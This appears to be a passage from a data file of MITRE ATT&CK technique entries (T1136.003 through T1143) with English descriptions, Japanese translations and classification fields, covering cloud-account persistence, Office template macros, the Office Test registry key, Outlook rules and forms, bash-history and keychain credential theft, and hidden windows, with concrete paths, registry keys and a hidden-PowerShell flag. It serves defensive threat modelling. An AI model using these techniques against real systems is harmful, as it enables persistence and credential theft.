T1136.003,T1136,Cloud Account,クラウドアカウント,"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users) In addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment.(Citation: Microsoft Entra ID Service Principals) In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).(Citation: GCP Service Accounts) While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.(Citation: AWS Instance Profiles)(Citation: AWS Lambda Execution Role) Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection. Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",攻撃者は被害システムへのアクセスを維持するためクラウドアカウントを作成する可能性がある。十分なアクセス権限があれば、こうしたアカウントはシステム上に常駐型リモートアクセスツールを展開する必要のない二次的な認証アクセスを確立するために使用される。(引用: Microsoft O365 管理者ロール)(引用: Microsoft サポート O365 別の管理者の追加、2019年10月)(引用: AWS IAMユーザーの生成)(引用元: GCP Cloud Identityユーザーの生成)(引用元: Microsoft Azure ADユーザー) ユーザーアカウントに加え、クラウドアカウントはサービスに関連付けられる場合がある。クラウドプロバイダーはサービスアカウントの概念を異なる方法で扱う。Azureでは、サービスアカウントにはサービスプリンシパルとマネージドIDが含まれ、OAuthアプリケーション、サーバーレス関数、仮想マシンなどの様々なリソースにリンクすることで、それらのリソースに環境内で様々な活動を実行する権限を付与できる。(引用: Microsoft Entra ID サービスプリンシパル) GCP では、サービスアカウントも特定のリソースにリンクできるほか、他のアカウントによる [一時的な昇格クラウドアクセス](https://attack.mitre.org/techniques/T1548/005) のためのなりすまし対象となります。(引用元: GCP Service Accounts) AWSにはサービスアカウントという概念は存在しませんが、リソースに直接ロールの引き継ぎ権限を付与できます。(引用元: AWS Instance Profiles)(引用元: AWS Lambda Execution Role) 攻撃者は特定のクラウドサービスのみにアクセス可能なアカウントを作成し、検知の可能性を低減させることがあります。 攻撃者がクラウドアカウントを作成すると、そのアカウントを操作して永続性を確保し、追加リソースへのアクセスを許可できます。例えば、[追加のクラウド認証情報](https://attack.mitre.org/techniques/T1098/001) を追加したり、 [追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)を割り当てるなどして操作します。,persistence,IaaS;SaaS;Office Suite;Identity Provider,credential_abuse,foothold,authentication_system;identity_federation;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Identity / SaaS (IdP/SSO);Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--a009cb25-4801-4116-9105-80a91cf15c1b,2020-01-29T17:32:30.711Z,2025-04-15T22:01:16.589Z,,,,
T1137,,Office Application Startup,Officeアプリケーション起動時,"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins. A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)",攻撃者は起動間の永続化にMicrosoft Officeベースのアプリケーションを利用する場合がある。Microsoft Officeは企業ネットワーク内のWindowsベースOSで比較的普及しているアプリケーションスイートである。Officeベースのアプリケーション起動時に永続化に利用可能な複数のメカニズムが存在し、これにはOfficeテンプレートマクロやアドインの使用が含まれる。 Outlookでは、ルール、フォーム、ホームページなど、永続化を悪用できる様々な機能が発見されている（引用元：SensePost Ruler GitHub）。これらの永続化メカニズムはOutlook内で機能するほか、Office 365経由でも利用可能である（引用元：TechNet O365 Outlook Rules）。,persistence,Windows;Office Suite,config_policy_manipulation,foothold,network_connectivity;email_infrastructure;saas_in_use,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--2c4d4e92-0ccf-4a97-b54c-86d662988a53,2017-12-14T16:46:06.044Z,2025-04-15T22:54:32.990Z,,,,
T1137.001,T1137,Office Template Macros,Officeテンプレートマクロ,"Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template) Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored and pulled from remote locations.(Citation: GlobalDotName Jun 2019) Word Normal.dotm location:<br> <code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm</code> Excel Personal.xlsb location:<br> <code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code> Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm under <code>C:\Program Files (x86)\Microsoft Office\root\Office16\</code>, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.(Citation: GlobalDotName Jun 2019) An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",攻撃者は、侵害されたシステム上で永続性を獲得するためにMicrosoft Officeテンプレートを悪用する可能性があります。Microsoft Officeには、一般的なOfficeアプリケーションの一部であり、スタイルのカスタマイズに使用されるテンプレートが含まれています。アプリケーション内の基本テンプレートは、アプリケーションが起動するたびに使用されます。 (引用元: Microsoft Change Normal Template) Office Visual Basic for Applications (VBA) マクロ (引用元: MSDN VBA in Office) は基本テンプレートに挿入でき、永続化を得るために各Officeアプリケーション起動時にコードを実行するために使用される。WordとExcelの両方における実例が発見され公開されている。 デフォルトでは、Wordには悪意のあるマクロを含めるように変更可能なNormal.dotmテンプレートが作成されます。Excelにはデフォルトでテンプレートファイルは作成されませんが、自動的に読み込まれるように追加できます。(引用: enigma0x3 normal.dotm)(引用: Hexacorn Office Template Macros) 共有テンプレートもリモートロケーションに保存・取得される場合があります。(引用元: GlobalDotName Jun 2019) Word Normal.dotm 保存場所:<br> <code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm</code> Excel Personal.xlsb 保存場所:<br> <code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code> 攻撃者は、アプリケーションの検索順序を乗っ取ることで（例：Word 2016は最初に<code>C:\Program Files (x86)\Microsoft Office\root\Office16\</code>下のNormal.dotmを検索する）、またはGlobalDotNameレジストリキーを変更することで、ベーステンプレートの場所を自身のものに変更する可能性があります。 GlobalDotNameレジストリキーを変更することで、攻撃者はアプリケーション起動時に読み込まれるテンプレートの任意の場所、ファイル名、ファイル拡張子を指定できます。 GlobalDotName を悪用するには、攻撃者はまずテンプレートを信頼済み文書として登録するか、信頼できる場所に配置する必要がある場合があります。(引用: GlobalDotName 2019年6月) マクロの使用に関するシステムまたは企業のセキュリティポリシーによっては、攻撃者はマクロを無制限に実行できるようにする必要がある場合があります。,persistence,Windows;Office Suite,config_policy_manipulation,foothold,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;File Server;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--79a47ad0-fc3b-4821-9f01-a026b1ddba21,2019-11-07T20:29:17.788Z,2025-04-15T22:54:50.299Z,,,,
T1137.002,T1137,Office Test,Office Test,"Adversaries may abuse the Microsoft Office ""Office Test"" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy) There exist user and global Registry keys for the Office Test feature, such as: * <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code> Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",攻撃者は、侵害されたシステム上で永続性を得るために、Microsoft Officeの「Office Test」レジストリキーを悪用する可能性があります。Office Testレジストリの場所が存在し、ユーザーは任意のDLLを指定でき、Officeアプリケーションが起動されるたびに実行されます。このレジストリキーは、MicrosoftがOfficeアプリケーション開発中にテストおよびデバッグ目的でDLLをロードするために使用すると考えられています。 このレジストリキーは、Officeインストール時にデフォルトでは作成されません。（引用元：Hexacorn Office Test）（引用元：Palo Alto Office Test Sofacy）Office Test機能には、以下のようなユーザーおよびグローバルレジストリキーが存在します：* <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code> * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code> 攻撃者はこのレジストリキーを追加し、WordやExcelなどのOfficeアプリケーション起動時に実行される悪意のあるDLLを指定する可能性があります。,persistence,Windows;Office Suite,config_policy_manipulation,foothold,user_interaction;endpoint_execution,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--ed7efd4d-ce28-4a19-a8e6-c58011eb2c7a,2019-11-07T19:44:04.475Z,2025-04-15T22:55:04.029Z,,,,
T1137.003,T1137,Outlook Forms,Outlook フォーム,"Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms) Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SensePost Outlook Forms)",攻撃者は、侵害されたシステム上で永続性を得るためにMicrosoft Outlookフォームを悪用する可能性があります。 Outlookフォームは、Outlookメッセージにおける表示と機能のテンプレートとして使用されます。悪意のある攻撃者が、同じカスタムOutlookフォームを利用した特別に細工された電子メールを送信すると、コードを実行するカスタムOutlookフォームを作成できます。（引用元：SensePost Outlook Forms）悪意のあるフォームがユーザーのメールボックスに追加されると、Outlookの起動時に読み込まれます。悪意のあるフォームは、攻撃者がユーザーに特別に細工された電子メールを送信すると実行されます。（引用元：SensePost Outlook Forms）,persistence,Windows;Office Suite,other,foothold,user_interaction;endpoint_execution;email_infrastructure,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--a9e2cea0-c805-4bf8-9e31-f5f0513a3634,2019-11-07T20:06:02.624Z,2025-04-15T22:55:18.800Z,,,,
T1137.004,T1137,Outlook Home Page,Outlookホームページ,"Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page) Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)",攻撃者は、侵害されたシステム上で永続性を得るために、Microsoft Outlookのホームページ機能を悪用する可能性があります。Outlookホームページは、Outlookフォルダーの表示をカスタマイズするために使用されるレガシー機能です。この機能により、フォルダーが開かれるたびに内部または外部のURLを読み込み、表示することが可能です。 悪意のあるHTMLページを作成し、Outlookホームページで読み込まれた際にコードを実行させることが可能です。（出典：SensePost Outlook Home Page）悪意のあるホームページがユーザーのメールボックスに追加されると、Outlook起動時に読み込まれます。悪意のあるホームページは、該当するOutlookフォルダーが読み込まれる/再読み込みされる際に実行されます。（出典：SensePost Outlook Home Page）,persistence,Windows;Office Suite,other,foothold,user_interaction;endpoint_execution;email_infrastructure,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--bf147104-abf9-4221-95d1-e81585859441,2019-11-07T20:09:56.536Z,2025-04-15T22:55:34.415Z,,,,
T1137.005,T1137,Outlook Rules,Outlookルール,"Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules) Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)",攻撃者はMicrosoft Outlookルールを悪用し、侵害されたシステム上で永続性を獲得する可能性があります。Outlookルールはユーザーがメールメッセージを管理するための自動化動作を定義することを可能にします。例えば、特定の送信者からの特定の単語を含むメールを自動的にOutlookの特定フォルダに移動するといった良性のルールが考えられます。 悪意のあるOutlookルールを作成し、攻撃者が特定の仕掛けを施したメールをそのユーザーに送信した際にコード実行をトリガーさせることが可能です。（出典：SilentBreak Outlook Rules）悪意のあるルールがユーザーのメールボックスに追加されると、Outlook起動時に読み込まれます。攻撃者が特定の仕掛けを施したメールをユーザーに送信した際に、悪意のあるルールが実行されます。（出典：SilentBreak Outlook Rules）,persistence,Windows;Office Suite,config_policy_manipulation,foothold,user_interaction;endpoint_execution;email_infrastructure,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--3d1b9d7e-3921-4d25-845a-7d9f15c0da44,2019-11-07T20:00:25.560Z,2025-04-15T22:55:47.125Z,,,,
T1137.006,T1137,Add-ins,アドイン,"Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018) Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.",攻撃者は、侵害されたシステム上で永続性を得るためにMicrosoft Officeアドインを悪用する可能性があります。Officeアドインは、Officeプログラムに機能を追加するために使用できます。（引用元：Microsoft Office Add-ins） 各種Office製品で使用可能なアドインには、Word/Excelアドインライブラリ（WLL/XLL）、VBAアドイン、Office Component Object Model（COM）アドイン、オートメーションアドイン、VBAエディター（VBE）、Visual Studio Tools for Office（VSTO）アドイン、Outlookアドインなど、異なる種類が存在する。 (引用元: MRWLabs Office Persistence Add-ins)(引用元: FireEye Mail CDS 2018) アドインは、Officeアプリケーション起動時にコードを実行するよう設定できるため、永続化手段として利用可能です。,persistence,Windows;Office Suite,other,foothold,endpoint_execution,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--34f1d81d-fe88-4f97-bd3b-a3164536255d,2019-11-07T19:52:52.801Z,2025-04-15T21:45:27.400Z,,,,
T1138,,Application Shimming,アプリケーション・シミング,"The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses [Hooking](https://attack.mitre.org/techniques/T1179) to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in: * <code>%WINDIR%\AppPatch\sysmain.sdb</code> * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code> Custom databases are stored in: * <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code> To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Similar to [Hooking](https://attack.mitre.org/techniques/T1179), utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.",Microsoft Windows アプリケーション互換性インフラストラクチャ/フレームワーク (アプリケーションシミング) は、オペレーティングシステムのコードベースが時間の経過とともに変化しても、ソフトウェアの後方互換性を確保するために作成されました。 たとえば、アプリケーション・シミング機能により、開発者は Windows XP 用に作成されたアプリケーションに（コードを書き換えることなく）修正を適用して、Windows 10 で動作させることができます。(引用: Elastic Process Injection July 2017) このフレームワーク内では、プログラム（より具体的には、インポート・アドレス・テーブル）と Windows OS の間のバッファとして機能するシムが作成されます。 プログラムが実行されると、シムキャッシュを参照してプログラムがシムデータベース（.sdb）の使用を必要とするかどうかを判断します。必要な場合、シムデータベースは[フッキング](https://attack.mitre.org/techniques/T1179)を使用して、OSと通信するために必要なコードのリダイレクトを行います。 デフォルトの Windows インストーラー (sdbinst.exe) によって現在インストールされているすべてのシムのリストは、以下の場所に保持されています:* <code>%WINDIR%\AppPatch\sysmain.sdb</code>* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>カスタムデータベースは以下に保存されます: * <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code> * <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code> シムのセキュリティを確保するため、Windowsではユーザーモードで実行されるように設計されており、カーネルを変更することはできません。また、シムをインストールするには管理者権限が必要です。 ただし、特定のシムは以下を実現可能です：* [ユーザー アカウント制御 (UAC) のバイパス](https://attack.mitre.org/techniques/T1088) (RedirectEXE)* プロセスへの DLL インジェクション (InjectDLL)* データ実行防止 (DisableNX) および構造例外処理 (DisableSEH) の無効化* メモリアドレスの取得 (GetProcAddress) の傍受 (GetProcAddress) といった操作が可能です。これらは[フッキング](https://attack.mitre.org/techniques/T1179)と同様に、攻撃者が特権昇格、バックドアのインストール、Windows Defenderなどの防御機能の無効化など、様々な悪意のある行為を実行することを可能にする可能性があります。,persistence;privilege-escalation,Windows,defense_disable,privilege_gain,privileged_account;user_interaction;endpoint_execution;database_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--7c93aa74-4bc0-4a9e-90ea-f25f86301566,2017-12-14T16:46:06.044Z,2025-04-25T15:15:46.767Z,,,,
T1139,,Bash History,Bash履歴,"Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",Bashは「history」ユーティリティでコマンドラインに入力されたコマンドを記録します。ユーザーがログアウトすると、履歴はユーザーの<code>.bash_history</code>ファイルに書き込まれます。このファイルは全ユーザー共通で<code>~/.bash_history</code>に存在します。通常、このファイルには直近500件のコマンドが保存されます。 ユーザーはプログラムの引数としてコマンドライン上でユーザー名やパスワードを入力することが多く、ログアウト時にこのファイルに保存されます。攻撃者はこのファイルを閲覧し、潜在的な認証情報を悪用する可能性があります。（出典: DA外部、OS X Way）,credential-access,Linux;macOS,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--44dca04b-808d-46ca-b25f-d85236d4b9f8,2017-12-14T16:46:06.044Z,2025-04-25T15:15:27.713Z,,,,
T1140,,Deobfuscate/Decode Files or Information,ファイルや情報の難読化解除/復号化,Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023) Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016),攻撃者は侵入の痕跡を分析から隠すため、[難読化されたファイルや情報](https://attack.mitre.org/techniques/T1027)を使用する場合があります。その情報の利用目的に応じて、別途デコードや難読化解除のメカニズムが必要となる可能性があります。 その方法には、マルウェアの組み込み機能やシステム上のユーティリティの使用が含まれる。一例として、証明書ファイル内に隠されたリモートアクセスツールのポータブル実行ファイルを復号するために[certutil](https://attack.mitre.org/software/S0160)を使用するケースがある。(出典: Malwarebytes Targeted Attack against Saudi Arabia) 別の例としては、Windowsの<code>copy /b</code>コマンドや<code>type</code>コマンドを用いて、バイナリ断片を悪意のあるペイロードに再構築する方法がある。(出典: Carbon Black Obfuscation Sept 2016)(出典: Sentinel One Tainted Love 2023) [ユーザー実行](https://attack.mitre.org/techniques/T1204)の一環として、難読化解除や復号化のためにユーザー操作が必要な場合がある。また、攻撃者が提供したパスワード保護された圧縮/暗号化ファイルを開くために、ユーザーがパスワードを入力する必要が生じることもある。(出典: Volexity PowerDuke November 2016),defense-evasion,ESXi;Linux;Windows;macOS,credential_abuse,stealth,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c,2017-12-14T16:46:06.044Z,2025-04-15T19:58:24.400Z,,,,
T1141,,Input Prompt,入力プロンプト,"When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1088)). Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1155)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and [PowerShell](https://attack.mitre.org/techniques/T1086)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015).",現在のユーザーコンテキストで付与されている権限よりも高い権限を必要とするプログラムが実行される場合、オペレーティングシステムは通常、タスクの昇格された権限を承認するための適切な認証情報をユーザーに要求するプロンプトを表示します（例：[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1088)）。 攻撃者は、追加アクセスを要求する偽のインストーラーや偽のマルウェア除去スイートなど、通常の使用を模倣する様々な理由から、一見正当なプロンプトでユーザーに認証情報を要求するこの機能を模倣することがある。（引用元：OSX Malware Exploits MacKeeper）この種のプロンプトは、[AppleScript](https://attack.mitre.org/techniques/T1155)などの様々な言語を通じて認証情報を収集するために使用される可能性がある。（引用元：LogRhythm Do You Trust 2014年10月）（引用元：OSX Keydnap malware）や[PowerShell](https://attack.mitre.org/techniques/T1086)（引用元：LogRhythm Do You Trust 2014年10月）（引用元：Enigma Phishing for Credentials 2015年1月）など、様々な言語で利用可能です。,credential-access,macOS;Windows,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--91ce1ede-107f-4d8b-bf4c-735e8789c94b,2017-12-14T16:46:06.044Z,2025-04-25T15:15:52.647Z,,,,
T1142,,Keychain,キーチェーン,"Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials. To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user’s logon credentials.","キーチェーンは、macOS が WiFi パスワード、ウェブサイト、セキュリティ保護されたメモ、証明書、Kerberos などの多くのサービスや機能に関するユーザーのパスワードや認証情報を追跡するための組み込みの方法です。 キーチェーンファイルは、<code>~/Library/Keychains/</code>、<code>/Library/Keychains/</code>、および <code>/Network/Library/Keychains/</code> にあります。(引用: Wikipedia keychain) macOS にデフォルトで組み込まれている <code>security</code> コマンドラインユーティリティは、これらの認証情報を管理するのに便利な方法を提供します。 ユーザーはキーチェーンにアクセスするために追加の認証情報を使用する必要があります。攻撃者がログインキーチェーンの認証情報を知っていれば、この保管庫に保存されている他のすべての認証情報にアクセスできます。（引用元：External to DA, the OS X Way）デフォルトでは、キーチェーンのパスフレーズはユーザーのログイン認証情報です。",credential-access,macOS,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;Log / Monitoring Server;Server (On-Prem/VM);Wireless Access Point,revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--9e09ddb2-1746-4448-9cad-7f8b41777d6d,2017-12-14T16:46:06.044Z,2025-04-25T15:15:55.375Z,,,,
T1143,,Hidden Window,隠しウィンドウ,"Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system. ### Windows There are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019) ### Mac The configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)",攻撃者は、悪意のある活動をユーザーの視界から隠すために非表示ウィンドウを実装する場合があります。アプリケーションが操作を実行する際に通常表示されるウィンドウを非表示にできるケースもあります。これはシステム管理者が管理タスクを実行する際、ユーザーの作業環境を妨げないために利用されることがあります。攻撃者は、システム上での自身の活動をユーザーに気付かれないようにするため、本来表示されるべきウィンドウをユーザーから隠すためにOS機能を悪用する可能性があります。 ### WindowsWindowsでは、[PowerShell](https://attack.mitre.org/techniques/T1086)、Jscript、VBScriptなどのスクリプト言語に、ウィンドウを非表示にする様々な機能があります。 一例として<code>powershell.exe -WindowStyle Hidden</code>が挙げられる。(出典: PowerShell About 2019)### Mac 